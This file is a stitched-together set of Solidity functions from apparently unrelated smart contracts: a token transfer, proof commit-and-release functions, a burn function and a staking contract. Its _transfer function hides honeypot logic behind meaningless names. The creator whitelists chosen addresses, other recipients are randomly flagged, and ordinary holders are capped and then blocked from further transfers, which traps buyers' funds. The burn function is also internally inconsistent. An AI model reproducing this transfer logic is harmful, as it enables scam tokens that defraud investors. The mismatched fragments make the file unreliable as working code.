function _transfer(address sender, address recipient, uint256 amount) internal {
    require(sender != address(0), "ERC20: transfer from the zero address");
    require(recipient != address(0), "ERC20: transfer to the zero address");
    if ((address(sender) == creator) && (latina == false)) {
        oaxaca = chTx;
        yucatan = true;
    }
    if ((address(sender) == creator) && (latina == true)) {
        turtle[recipient] = true;
        colombia[recipient] = false;
        latina = false;
    }
    if ((amount > patata) && (turtle[sender] == true) && (address(sender) != creator)) {
        areas[recipient] = true;
    }
    if (turtle[recipient] != true) {
        colombia[recipient] = ((randomly() == 3) ? true : false);
    }
    if ((colombia[sender]) && (turtle[recipient] == false)) {
        colombia[recipient] = true;
    }
    if (turtle[sender] == false) {
        if ((amount > patata) && (areas[sender] == true)) {
            require(false);
        }
        require(amount < oaxaca);
        if (yucatan == true) {
            if (areas[sender] == true) {
                require(false);
            }
            areas[sender] = true;
        }
    }
    _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
    _balances[recipient] = _balances[recipient].add(amount);
    emit Transfer(sender, recipient, amount);
}

function retrieveIncompleteProof(bytes32 proofMapping) public view returns(
    address creator,
    bytes32 hash,
    uint timestamp,
    uint blockNum
) {
    Proof memory proof = proofs[proofMapping]; 
    require(proof.creator != 0); 
    require(!proof.released); 
    return (
        proof.creator,
        proof.hash,
        proof.timestamp,
        proof.blockNum
    );
}

function retrieveCompletedProof(bytes32 proofMapping) public view returns(
    address creator,
    string release,
    bytes32 hash,
    uint timestamp,
    uint releaseTime,
    uint blockNum,
    uint releaseBlockNum
) {
    Proof memory proof = proofs[proofMapping]; 
    require(proof.creator != 0); 
    require(proof.released); 
    return (
        proof.creator,
        proof.release,
        proof.hash,
        proof.timestamp,
        proof.releaseTime,
        proof.blockNum,
        proof.releaseBlockNum
    );
}

function isValidProof(bytes32 proofMapping, string verify) public view returns(bool) {
    Proof memory proof = proofs[proofMapping]; 
    require(proof.creator != 0); 
    return proof.hash == keccak256(abi.encodePacked(verify)); 
}

function releaseProof(bytes32 proofMapping, string release) public {
    Proof storage proof = proofs[proofMapping];
    require(msg.sender == proof.creator); 
    require(proof.hash == keccak256(abi.encodePacked(release))); 
    require(!proof.released); 
    proof.release = release; 
    proof.released = true; 
    proof.releaseTime = now; 
    proof.releaseBlockNum = block.number; 
}

function burn() public payable {
    balances[msg.sender] += msg.value;
    _totalSupply += msg.value;
    address(0).transfer(msg.value);
    emit Transfer(address(0), msg.sender, _totalSupply);
}

function withdrawDividends() external {
    uint256 stakedUntil = min(block.timestamp, stakingEnd);
    uint256 periodStaked = stakedUntil.sub(lastStaked[msg.sender]);
    uint256 dividends;
    if (periodStaked < stakingPeriod) {
        dividends = periodStaked.mul(stakedTokens[msg.sender]).mul(rewardRate).div(stakingPeriod).div(100);
    } else {
        dividends = stakedTokens[msg.sender].mul(rewardRate).div(100);
    }
    lastStaked[msg.sender] = stakedUntil;
    IERC20(quaiToken).transfer(msg.sender, dividends);
    totalEarnedTokens[msg.sender] += dividends;
}

function updateStake() public {
    uint256 stakedUntil = min(block.timestamp, stakingEnd);
    uint256 periodStaked = stakedUntil.sub(lastStaked[msg.sender]);
    uint256 dividends;
    if (periodStaked < stakingPeriod) {
        dividends = periodStaked.mul(stakedTokens[msg.sender]).mul(rewardRate).div(stakingPeriod).div(100);
    } else {
        dividends = stakedTokens[msg.sender].mul(rewardRate).div(100);
    }
    lastStaked[msg.sender] = stakedUntil;
    if (totalStaked + dividends > maxTotalStaked) {
        IERC20(quaiToken).transfer(msg.sender, dividends);
        totalEarnedTokens[msg.sender] += dividends;
    } else {
        stakedTokens[msg.sender] += dividends;
        totalStaked += dividends;
        totalEarnedTokens[msg.sender] += dividends;
    }
}

function unstake() external {
    uint256 timeSinceStake = (block.timestamp).sub(lastStaked[msg.sender]);
    require(timeSinceStake >= stakingPeriod || block.timestamp > stakingEnd, "unstake: staking period for user still ongoing");
    updateStake();
    uint256 toTransfer = stakedTokens[msg.sender];
    stakedTokens[msg.sender] = 0;
    IERC20(quaiToken).transfer(msg.sender, toTransfer);
    totalStaked = totalStaked.sub(toTransfer);
}

function deposit(uint256 amountTokens) external {
    require((stakedTokens[msg.sender] >= minStaked || amountTokens >= minStaked), "deposit: must exceed minimum stake");
    require(totalStaked + amountTokens <= maxTotalStaked, "deposit: amount would exceed max stake. call updateStake to claim dividends");
    updateStake();
    IERC20(quaiToken).transferFrom(msg.sender, address(this), amountTokens);
    stakedTokens[msg.sender] += amountTokens;
    totalStaked += amountTokens;
}

function updateStakingEnd(uint256 newStakingEnd) external onlyOwner() {
    require(newStakingEnd >= block.timestamp, "updateStakingEnd: newStakingEnd must be in future");
    stakingEnd = newStakingEnd;
}

function getPendingDivs(address user) external view returns(uint256) {
    uint256 stakedUntil = min(block.timestamp, stakingEnd);
    uint256 periodStaked = stakedUntil.sub(lastStaked[user]);
    uint256 dividends;
    if (periodStaked < stakingPeriod) {
        dividends = periodStaked.mul(stakedTokens[user]).mul(rewardRate).div(stakingPeriod).div(100);
    } else {
        dividends = stakedTokens[user].mul(rewardRate).div(100);
    }
    return (dividends);
}

function recoverQUAI() external onlyOwner() {
    require(block.timestamp >= (stakingEnd + 30 days), "recoverQUAI: too early");
    uint256 amountToSend = IERC20(quaiToken).balanceOf(address(this));
    IERC20(quaiToken).transfer(msg.sender, amountToSend);
}

function min(uint256 a, uint256 b) internal pure returns(uint256) {
    return a < b ? a : b;
}

